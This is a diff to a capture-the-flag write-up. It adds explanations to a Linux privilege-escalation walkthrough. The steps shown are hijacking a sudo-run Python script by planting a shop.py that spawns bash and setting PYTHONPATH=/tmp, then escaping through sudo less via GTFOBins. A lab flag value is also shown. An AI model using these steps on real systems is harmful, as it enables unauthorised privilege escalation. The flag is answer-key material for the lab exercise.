@@ -433,12 +433,15 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'shop'
 ```
 
+Sudo options explained. (Source manpage)
+
 ```bash
 env_reset    If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the callers environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The default contents of the env_keep and env_check lists are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
 
 setenv    Allow the user to disable the env_reset option from the command line via the -E option. Additionally, environment variables set via the command line are not subject to the restrictions imposed by env_check, env_delete, or env_keep. As such, only trusted users should be allowed to set variables in this manner. This flag is off by default.
-
 ```
+
+Creating a shop.py script in */tmp* dir with following contents
 
 ```python
 #!/usr/bin/python3
@@ -446,11 +449,12 @@ import os
 os.system("/bin/bash")
 ```
 
+Calling the */opt/scripts/Gun-Shop.py* command with path set to */tmp* dir
+
 ```bash
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
 ```
-
-The flag is reversed. Use `rev` to reverse it
+And we get a shell. Now just going to home dir for user *jordan* and `cat` out the *flag.txt*. The flag is reversed. Use `rev` to reverse it
 
 `jordan{fcbc4b3c31c9b58289b3946978f9e3c3}`
 
@@ -467,7 +471,7 @@ User jordan may run the following commands on linuxagency:
     (ken) NOPASSWD: /usr/bin/less
 ```
 
-Using [GTFOBINS]() for appropriate commands
+Using [GTFOBINS](https://gtfobins.github.io/gtfobins/less/) for appropriate commands
 
 ```bash
 sudo -u ken less /etc/profile
